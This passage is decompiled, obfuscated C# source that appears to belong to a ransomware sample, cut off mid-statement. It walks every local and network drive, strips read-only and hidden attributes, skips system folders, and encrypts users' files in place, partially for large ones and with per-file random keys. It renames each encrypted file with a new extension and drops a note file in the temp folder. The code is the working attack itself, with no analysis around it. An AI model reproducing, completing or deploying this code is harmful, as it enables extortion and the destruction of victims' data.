	public static void TUNusUrhcyiCD(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (YGBzDBzlDVGPdcyT)
			{
				try
				{
					File.AppendAllText(ZmxznfzcMXVgTR, getString_0(107386819) + string_0 + getString_0(107386810) + ex.Message + getString_0(107396570));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string PAnwnUZwtskZZp()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107390350);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107386209);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107386744))) ? getString_0(107386758) : getString_0(107386767));
				break;
			case 0:
				text = getString_0(107386749);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107386204);
				break;
			case 4:
				text = getString_0(107386223);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107386173) : getString_0(107386214));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107386181) : getString_0(107386186)) : getString_0(107386191)) : getString_0(107386168));
				break;
			case 10:
				text = getString_0(107386144);
				break;
			}
		}
		if (text != getString_0(107390350))
		{
			text = getString_0(107386139) + text;
			if (oSVersion.ServicePack != getString_0(107390350))
			{
				text = text + getString_0(107388187) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string IHSwKGrbCwqfhuq(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395683);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(hcAHXMuOvto(getString_0(107395650)));
				streamWriter.WriteLine(getString_0(107396570));
				streamWriter.WriteLine(hcAHXMuOvto(getString_0(107390272)));
				streamWriter.WriteLine(string_0);
				if (izNvindkdEa)
				{
					streamWriter.WriteLine(getString_0(107396570));
					streamWriter.WriteLine(hcAHXMuOvto(getString_0(107390194)));
					streamWriter.WriteLine(PRbKLyXwxCMy.jcnSxDGjlUW());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !TTTJwfHUqgyKmj)
				{
					File.AppendAllText(text, getString_0(107390161) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (YGBzDBzlDVGPdcyT)
			{
				try
				{
					File.AppendAllText(ZmxznfzcMXVgTR, getString_0(107386158) + ex.Message + getString_0(107396570));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void LZpyrhFdYSXDh(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		XydbNjCPrwlqLZ.sCAtfVfcXrwd CS_0024_003C_003E8__locals0 = new XydbNjCPrwlqLZ();
		CS_0024_003C_003E8__locals0.qVfvEpVNqJBLvh = string_1;
		CS_0024_003C_003E8__locals0.zIgOoCiQcdgcTO = string_2;
		CS_0024_003C_003E8__locals0.XJsqqBmwQnp = string_3;
		CS_0024_003C_003E8__locals0.rrtTQSJuAstKD = string_4;
		if (DTvMKyCnFvaC && !PAnwnUZwtskZZp().Contains(getString_0(107386173)) && !PAnwnUZwtskZZp().Contains(getString_0(107386069)))
		{
			AWXqigZnJOiPsfD.dgSWFwyokNlNB();
		}
		ZWfNLTTCJEsBadr = Convert.FromBase64String(CS_0024_003C_003E8__locals0.XJsqqBmwQnp);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395826))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = sWsRnVdvMz(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !apDawShQCtslB.Contains(text))
							{
								apDawShQCtslB.Add(text);
							}
							else if (!apDawShQCtslB.Contains(array[i].Name))
							{
								apDawShQCtslB.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!apDawShQCtslB.Contains(array[i].Name))
							{
								apDawShQCtslB.Add(array[i].Name);
							}
						}
					}
					else if (!apDawShQCtslB.Contains(array[i].Name))
					{
						apDawShQCtslB.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!apDawShQCtslB.Contains(string_0[j]))
				{
					apDawShQCtslB.Add(string_0[j]);
				}
			}
		}
		if (apDawShQCtslB.Contains(hcAHXMuOvto(getString_0(107386088))) && OrPntKgMIF == getString_0(107396771))
		{
			apDawShQCtslB.Remove(hcAHXMuOvto(getString_0(107386088)));
		}
		Parallel.ForEach(apDawShQCtslB, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new XydbNjCPrwlqLZ.sCAtfVfcXrwd();
			CS_0024_003C_003E8__locals0.GSHErlOGCrhsk = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.eyKRckGTMKw = string_0;
			if (xazslhOFeW && !PAnwnUZwtskZZp().Contains(XydbNjCPrwlqLZ.getString_0(107386185)) && !PAnwnUZwtskZZp().Contains(XydbNjCPrwlqLZ.getString_0(107386081)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						aPIhDICFGSi(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.eyKRckGTMKw);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (ZYTlzkdcoENHWE == XydbNjCPrwlqLZ.getString_0(107396783))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					GZcjjutrdguzHu(CS_0024_003C_003E8__locals0.eyKRckGTMKw, CS_0024_003C_003E8__locals0.GSHErlOGCrhsk.qVfvEpVNqJBLvh, CS_0024_003C_003E8__locals0.GSHErlOGCrhsk.rrtTQSJuAstKD, CS_0024_003C_003E8__locals0.GSHErlOGCrhsk.zIgOoCiQcdgcTO, CS_0024_003C_003E8__locals0.GSHErlOGCrhsk.XJsqqBmwQnp);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				GZcjjutrdguzHu(CS_0024_003C_003E8__locals0.eyKRckGTMKw, CS_0024_003C_003E8__locals0.qVfvEpVNqJBLvh, CS_0024_003C_003E8__locals0.rrtTQSJuAstKD, CS_0024_003C_003E8__locals0.zIgOoCiQcdgcTO, CS_0024_003C_003E8__locals0.XJsqqBmwQnp);
			}
		});
	}

	public static void GZcjjutrdguzHu(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107390350));
		List<string> list3 = list2;
		if (ZFufIjcSxgi == getString_0(107397060))
		{
			if (MJhhWuEvtXFgGh == getString_0(107396771) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && lGlbRPbkYb(string_0))
			{
				dvoPwjljzY dvoPwjljzY = null;
				try
				{
					dvoPwjljzY = new dvoPwjljzY(string_0.Replace(getString_0(107397173), getString_0(107390350)));
				}
				catch
				{
					list = ChLnyfZaoJcdH(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					LWlPHDDyRXHVip(dvoPwjljzY.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = ChLnyfZaoJcdH(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = ChLnyfZaoJcdH(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = xAVhAapNqi.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0453;
					}
				}
				if ((yjxvVDmYnvw == getString_0(107397060) && !item.EndsWith(text)) || kQacklGScvGB.Contains(item))
				{
					continue;
				}
				if (VtgyThVicrA == getString_0(107396771))
				{
					try
					{
						if (zGtpjDKaRKnN.xfoUezvsOShUpjR(item))
						{
							zGtpjDKaRKnN.kXZHKHEOIChOkFR(item);
						}
					}
					catch
					{
					}
				}
				kQacklGScvGB.Add(item);
				if (!XhCnheiZHlf.Contains(Path.GetDirectoryName(item)))
				{
					XhCnheiZHlf.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (DVGbUCJGnq == getString_0(107396771) && fileStream.Length > Convert.ToInt32(kituZbADEtf) * 1024 * 1024 && !list3.Contains(text))
					{
						if (KsYUZJCeItFet == getString_0(107396771))
						{
							foreach (string item2 in rSxQCGHPFw)
							{
								if (item.ToLower().EndsWith(item2) && BTmYNKJoWXy == getString_0(107396771))
								{
									if (Convert.ToInt32(ZgtheUfHxbisWo) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											PRbKLyXwxCMy.KUjtevBxHIDiZB(getString_0(107390399), getString_0(107390394), getString_0(107390413), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && BTmYNKJoWXy == getString_0(107397060))
								{
									try
									{
										PRbKLyXwxCMy.KUjtevBxHIDiZB(getString_0(107390399), getString_0(107390394), getString_0(107390413), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = PywWzStJmnOP.qDPulRCUpTwRa(item, Convert.ToInt32(kituZbADEtf) * 1024 * 1024);
						byte[] vfjTsBqJDSVT = PywWzStJmnOP.SCrqszkvgt(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						PywWzStJmnOP.eZPzeLHBKntVHTM(item, vfjTsBqJDSVT);
						if (string_2 != getString_0(107386047))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107386047))
					{
						fqcATKsWDYj(item, item + string_2, ZWfNLTTCJEsBadr);
					}
					else
					{
						fqcATKsWDYj(item, item + getString_0(107386042), ZWfNLTTCJEsBadr);
					}
				}
				catch (Exception)
				{
				}
				IL_0453:;
			}
		}
	}

	public static void LWlPHDDyRXHVip(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		VQdrzQouGeJmOOKE.hjDtcmdkFEUCoUqO CS_0024_003C_003E8__locals0 = new VQdrzQouGeJmOOKE();
		CS_0024_003C_003E8__locals0.fUBdEKZyHcMt = list_0;
		CS_0024_003C_003E8__locals0.ApXJMbmTnc = string_1;
		CS_0024_003C_003E8__locals0.fFnbbgAKLY = string_2;
		CS_0024_003C_003E8__locals0.aVkwyftWjF = string_3;
		CS_0024_003C_003E8__locals0.MVedNZaXiLgL = new List<string> { getString_0(107390350) };
		if (yjxvVDmYnvw == getString_0(107397060))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.fUBdEKZyHcMt)
				{
					if (!item.Contains(VQdrzQouGeJmOOKE.getString_0(107389314)) && !item.Contains(VQdrzQouGeJmOOKE.getString_0(107389257)) && !item.Contains(VQdrzQouGeJmOOKE.getString_0(107389224)) && !item.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389207)) && !item.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389194)) && !item.Contains(VQdrzQouGeJmOOKE.getString_0(107389169)) && !item.Contains(VQdrzQouGeJmOOKE.getString_0(107389180)) && !item.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389135)) && !item.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389154)) && !item.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389117)) && !item.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389076)) && !item.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389091)) && !item.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389545)) && !item.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389524)) && !item.Contains(VQdrzQouGeJmOOKE.getString_0(107389531)) && !item.Contains(VQdrzQouGeJmOOKE.getString_0(107389482)) && !item.Contains(VQdrzQouGeJmOOKE.getString_0(107389497)) && !item.Contains(VQdrzQouGeJmOOKE.getString_0(107389448)) && !item.Contains(VQdrzQouGeJmOOKE.getString_0(107389431)) && !item.Contains(VQdrzQouGeJmOOKE.getString_0(107389446)) && !item.Contains(VQdrzQouGeJmOOKE.getString_0(107389397)) && !item.Contains(VQdrzQouGeJmOOKE.getString_0(107389412)) && !item.Contains(VQdrzQouGeJmOOKE.getString_0(107389367)) && !item.Contains(VQdrzQouGeJmOOKE.getString_0(107389378)) && !item.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389333)) && !item.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389320)) && !item.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107388791)) && !item.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107388806)) && !item.Contains(hcAHXMuOvto(VQdrzQouGeJmOOKE.getString_0(107388757))) && !item.Contains(VQdrzQouGeJmOOKE.getString_0(107388764)) && !item.Contains(VQdrzQouGeJmOOKE.getString_0(107397220)) && !item.Contains(VQdrzQouGeJmOOKE.getString_0(107388719)) && !item.EndsWith(CS_0024_003C_003E8__locals0.ApXJMbmTnc) && !item.EndsWith(VQdrzQouGeJmOOKE.getString_0(107388694)) && !item.EndsWith(VQdrzQouGeJmOOKE.getString_0(107388689)) && !item.EndsWith(VQdrzQouGeJmOOKE.getString_0(107388684)) && !item.EndsWith(VQdrzQouGeJmOOKE.getString_0(107388711)) && !item.Contains(VQdrzQouGeJmOOKE.getString_0(107388706)) && !item.Contains(vyePyvbVLbeEqa) && !item.Contains(ZmxznfzcMXVgTR) && !item.Contains(xrvDxaCBctsjEXT))
					{
						if (CS_0024_003C_003E8__locals0.fFnbbgAKLY.Length != 0)
						{
							string[] fFnbbgAKLY2 = CS_0024_003C_003E8__locals0.fFnbbgAKLY;
							int num2 = 0;
							while (num2 < fFnbbgAKLY2.Length)
							{
								string value2 = fFnbbgAKLY2[num2];
								if (!item.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_0e93;
							}
						}
						try
						{
							if (item.EndsWith(CS_0024_003C_003E8__locals0.ApXJMbmTnc))
							{
								goto IL_0e93;
							}
						}
						catch (Exception)
						{
							goto IL_0e93;
						}
						if (item.EndsWith(string_0) && !kQacklGScvGB.Contains(item))
						{
							if (VtgyThVicrA == VQdrzQouGeJmOOKE.getString_0(107396791))
							{
								try
								{
									if (zGtpjDKaRKnN.xfoUezvsOShUpjR(item))
									{
										zGtpjDKaRKnN.kXZHKHEOIChOkFR(item);
									}
								}
								catch
								{
								}
							}
							kQacklGScvGB.Add(item);
							if (!XhCnheiZHlf.Contains(Path.GetDirectoryName(item)))
							{
								XhCnheiZHlf.Add(Path.GetDirectoryName(item));
							}
							TUNusUrhcyiCD(item);
							try
							{
								new qxmBSGuDUn().BIKmJflQUBqn(item);
							}
							catch
							{
							}
							try
							{
								using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
								if (!fileStream2.CanWrite)
								{
									try
									{
										if (zZWgofEFsLDUuOW)
										{
											Console.WriteLine(VQdrzQouGeJmOOKE.getString_0(107402554) + item + VQdrzQouGeJmOOKE.getString_0(107402477) + new FileInfo(item).Length + VQdrzQouGeJmOOKE.getString_0(107402488));
											Console.WriteLine(VQdrzQouGeJmOOKE.getString_0(107402447));
										}
									}
									catch
									{
									}
									rNfIJaiTMyCx(hcAHXMuOvto(VQdrzQouGeJmOOKE.getString_0(107402886)), VQdrzQouGeJmOOKE.getString_0(107388590) + item + VQdrzQouGeJmOOKE.getString_0(107388590) + hcAHXMuOvto(VQdrzQouGeJmOOKE.getString_0(107402829)) + VQdrzQouGeJmOOKE.getString_0(107388590) + Environment.UserName + VQdrzQouGeJmOOKE.getString_0(107388590) + hcAHXMuOvto(VQdrzQouGeJmOOKE.getString_0(107402844)));
								}
							}
							catch (Exception ex18)
							{
								if (YGBzDBzlDVGPdcyT)
								{
									try
									{
										File.AppendAllText(ZmxznfzcMXVgTR, VQdrzQouGeJmOOKE.getString_0(107386839) + item + VQdrzQouGeJmOOKE.getString_0(107402819) + ex18.Message + VQdrzQouGeJmOOKE.getString_0(107396590));
									}
									catch (Exception)
									{
									}
								}
								continue;
							}
							try
							{
								try
								{
									if (new FileInfo(item).Length != 0L)
									{
										goto end_IL_0716;
									}
									goto end_IL_0716_2;
									end_IL_0716:;
								}
								catch (Exception ex20)
								{
									if (YGBzDBzlDVGPdcyT)
									{
										try
										{
											File.AppendAllText(ZmxznfzcMXVgTR, VQdrzQouGeJmOOKE.getString_0(107386839) + item + VQdrzQouGeJmOOKE.getString_0(107402706) + ex20.Message + VQdrzQouGeJmOOKE.getString_0(107396590));
										}
										catch (Exception)
										{
										}
									}
									IwoWsCVOvNqeRACr++;
									goto end_IL_0716_2;
								}
								if (!(DVGbUCJGnq == VQdrzQouGeJmOOKE.getString_0(107396791)) || new FileInfo(item).Length <= Convert.ToInt32(kituZbADEtf) * 1024 * 1024 || CS_0024_003C_003E8__locals0.MVedNZaXiLgL.Contains(string_0))
								{
									if (izNvindkdEa)
									{
										CS_0024_003C_003E8__locals0.ApXJMbmTnc = PDiDpTsAaoZu + CS_0024_003C_003E8__locals0.ApXJMbmTnc;
									}
									string text5 = PXBlVMuKtjxUxD.bQxbGMQPqE(32);
									string text6 = VQdrzQouGeJmOOKE.getString_0(107390370);
									text6 = (TTTJwfHUqgyKmj ? PXBlVMuKtjxUxD.NKBPlLpLanL() : VQdrzQouGeJmOOKE.getString_0(107390370));
									string s3 = pmEBRznCyJCsrx.otEPbnvZbIA(text5 + text6);
									byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
									if (CS_0024_003C_003E8__locals0.ApXJMbmTnc != VQdrzQouGeJmOOKE.getString_0(107386067))
									{
										if (!lMzMCwfLjdb)
										{
											if (!TTTJwfHUqgyKmj)
											{
												tjNNgredhuoLn(item, item + CS_0024_003C_003E8__locals0.ApXJMbmTnc, ZWfNLTTCJEsBadr);
											}
											else
											{
												tjNNgredhuoLn(item, item + CS_0024_003C_003E8__locals0.ApXJMbmTnc, Convert.FromBase64String(text5));
											}
										}
										else
										{
											try
											{
												if (!TTTJwfHUqgyKmj)
												{
													xupzWdtCvyjPfw(item, item + CS_0024_003C_003E8__locals0.ApXJMbmTnc, ZWfNLTTCJEsBadr, Convert.FromBase64String(UQzJrkNAgAyNPg));
												}
												else
												{
													xupzWdtCvyjPfw(item, item + CS_0024_003C_003E8__locals0.ApXJMbmTnc, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
												}
											}
											catch (Exception ex22)
											{
												if (YGBzDBzlDVGPdcyT)
												{
													try
													{
														File.AppendAllText(ZmxznfzcMXVgTR, VQdrzQouGeJmOOKE.getString_0(107386839) + item + VQdrzQouGeJmOOKE.getString_0(107386085) + ex22.Message + VQdrzQouGeJmOOKE.getString_0(107396590));
													}
													catch (Exception)
													{
													}
												}
												IwoWsCVOvNqeRACr++;
												try
												{
													File.Move(item + CS_0024_003C_003E8__locals0.ApXJMbmTnc, item);
												}
												catch (Exception)
												{
												}
												goto end_IL_0716_2;
											}
										}
									}
									else if (!lMzMCwfLjdb)
									{
										if (!TTTJwfHUqgyKmj)
										{
											tjNNgredhuoLn(item, item + VQdrzQouGeJmOOKE.getString_0(107386062), ZWfNLTTCJEsBadr);
										}
										else
										{
											tjNNgredhuoLn(item, item + VQdrzQouGeJmOOKE.getString_0(107386062), Convert.FromBase64String(text5));
										}
									}
									else
									{
										try
										{
											if (!TTTJwfHUqgyKmj)
											{
												xupzWdtCvyjPfw(item, item, ZWfNLTTCJEsBadr, Convert.FromBase64String(UQzJrkNAgAyNPg));
											}
											else
											{
												xupzWdtCvyjPfw(item, item, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
											}
										}
										catch (Exception ex25)
										{
											if (YGBzDBzlDVGPdcyT)
											{
												try
												{
													File.AppendAllText(ZmxznfzcMXVgTR, VQdrzQouGeJmOOKE.getString_0(107386839) + item + VQdrzQouGeJmOOKE.getString_0(107386085) + ex25.Message + VQdrzQouGeJmOOKE.getString_0(107396590));
												}
												catch (Exception)
												{
												}
											}
											IwoWsCVOvNqeRACr++;
											goto end_IL_0716_2;
										}
									}
									if (TTTJwfHUqgyKmj)
									{
										if (CS_0024_003C_003E8__locals0.ApXJMbmTnc != VQdrzQouGeJmOOKE.getString_0(107386067))
										{
											TnxDxZQzabkSS(item + CS_0024_003C_003E8__locals0.ApXJMbmTnc, bytes3);
										}
										else
										{
											TnxDxZQzabkSS(item, bytes3);
										}
									}
									goto IL_0e93;
								}
								CS_0024_003C_003E8__locals0 = new VQdrzQouGeJmOOKE.AGSmvpoqel();
								CS_0024_003C_003E8__locals0.ZJsnJmUSSBrjdDIR = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.ApXJMbmTnc != VQdrzQouGeJmOOKE.getString_0(107386067))
									{
										if (izNvindkdEa)
										{
											CS_0024_003C_003E8__locals0.ApXJMbmTnc = PDiDpTsAaoZu + CS_0024_003C_003E8__locals0.ApXJMbmTnc;
										}
										File.Move(item, item + CS_0024_003C_003E8__locals0.ApXJMbmTnc);
									}
								}
								catch (Exception ex27)
								{
									if (YGBzDBzlDVGPdcyT)
									{
										try
										{
											File.AppendAllText(ZmxznfzcMXVgTR, VQdrzQouGeJmOOKE.getString_0(107386839) + item + VQdrzQouGeJmOOKE.getString_0(107402645) + ex27.Message + VQdrzQouGeJmOOKE.getString_0(107396590));
										}
										catch (Exception)
										{
										}
									}
									IwoWsCVOvNqeRACr++;
									goto end_IL_0716_2;
								}
								CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB = VQdrzQouGeJmOOKE.getString_0(107390370);
								if (CS_0024_003C_003E8__locals0.ApXJMbmTnc != VQdrzQouGeJmOOKE.getString_0(107386067))
								{
									CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB = item + CS_0024_003C_003E8__locals0.ApXJMbmTnc;
								}
								else
								{
									CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB = item;
								}
								if (KsYUZJCeItFet == VQdrzQouGeJmOOKE.getString_0(107396791))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in rSxQCGHPFw)
										{
											if (CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.ZJsnJmUSSBrjdDIR.ApXJMbmTnc) && BTmYNKJoWXy == VQdrzQouGeJmOOKE.AGSmvpoqel.getString_0(107396794))
											{
												if (Convert.ToInt32(ZgtheUfHxbisWo) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB).Length)
												{
													try
													{
														PRbKLyXwxCMy.KUjtevBxHIDiZB(VQdrzQouGeJmOOKE.AGSmvpoqel.getString_0(107390422), VQdrzQouGeJmOOKE.AGSmvpoqel.getString_0(107390417), VQdrzQouGeJmOOKE.AGSmvpoqel.getString_0(107390436), CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB.ToLower().EndsWith(item2) && BTmYNKJoWXy == VQdrzQouGeJmOOKE.AGSmvpoqel.getString_0(107397083))
											{
												try
												{
													PRbKLyXwxCMy.KUjtevBxHIDiZB(VQdrzQouGeJmOOKE.AGSmvpoqel.getString_0(107390422), VQdrzQouGeJmOOKE.AGSmvpoqel.getString_0(107390417), VQdrzQouGeJmOOKE.AGSmvpoqel.getString_0(107390436), CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text7 = PXBlVMuKtjxUxD.bQxbGMQPqE(32);
								string text8 = VQdrzQouGeJmOOKE.getString_0(107390370);
								text8 = (TTTJwfHUqgyKmj ? PXBlVMuKtjxUxD.NKBPlLpLanL() : VQdrzQouGeJmOOKE.getString_0(107390370));
								string s4 = pmEBRznCyJCsrx.otEPbnvZbIA(text7 + text8);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (uZGrkbWLHwtb == VQdrzQouGeJmOOKE.getString_0(107397080))
								{
									byte[] array2 = null;
									byte[] byte_2 = PywWzStJmnOP.qDPulRCUpTwRa(CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB, Convert.ToInt32(kituZbADEtf) * 1024 * 1024);
									if (PywWzStJmnOP.eZPzeLHBKntVHTM(VfjTsBqJDSVT: (!ToytCwhuOZ) ? (TTTJwfHUqgyKmj ? PywWzStJmnOP.SCrqszkvgt(byte_2, Convert.FromBase64String(text7), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : PywWzStJmnOP.SCrqszkvgt(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.aVkwyftWjF), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (TTTJwfHUqgyKmj ? LQKLndoDiyu.GrlNceGkOvk(byte_2, Convert.FromBase64String(text7), Convert.FromBase64String(text8)) : LQKLndoDiyu.GrlNceGkOvk(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.aVkwyftWjF), Convert.FromBase64String(UQzJrkNAgAyNPg))), eDBBwAsYeVCx: CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB, EeTyBkmkZsu: bytes4))
									{
										goto IL_0e93;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.ApXJMbmTnc, item);
									}
									catch (Exception)
									{
									}
								}
								else if (!TTTJwfHUqgyKmj)
								{
									if (xwkLEGVxhadEUV.ROTZWSZwBsMXoW(CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB, kituZbADEtf, CS_0024_003C_003E8__locals0.aVkwyftWjF, null, Convert.FromBase64String(UQzJrkNAgAyNPg)))
									{
										goto IL_0e93;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.ApXJMbmTnc, item);
									}
									catch (Exception)
									{
									}
								}
								else
								{
									if (xwkLEGVxhadEUV.ROTZWSZwBsMXoW(CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB, kituZbADEtf, text7, bytes4, Convert.FromBase64String(text8)))
									{
										goto IL_0e93;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.ApXJMbmTnc, item);
									}
									catch (Exception)
									{
									}
								}
								end_IL_0716_2:;
							}
							catch (Exception)
							{
								goto IL_0e93;
							}
						}
					}
					continue;
					IL_0e93:
					CS_0024_003C_003E8__locals0.fUBdEKZyHcMt.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.fUBdEKZyHcMt, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new VQdrzQouGeJmOOKE.hjDtcmdkFEUCoUqO();
			CS_0024_003C_003E8__locals0.ZJsnJmUSSBrjdDIR = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.HDYHoqvFVoE = string_0;
			if (!CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(VQdrzQouGeJmOOKE.getString_0(107389314)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(VQdrzQouGeJmOOKE.getString_0(107389257)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(VQdrzQouGeJmOOKE.getString_0(107389224)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389207)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389194)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(VQdrzQouGeJmOOKE.getString_0(107389169)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(VQdrzQouGeJmOOKE.getString_0(107389180)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389135)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389154)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389117)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389076)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389091)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(VQdrzQouGeJmOOKE.getString_0(107389545)) && 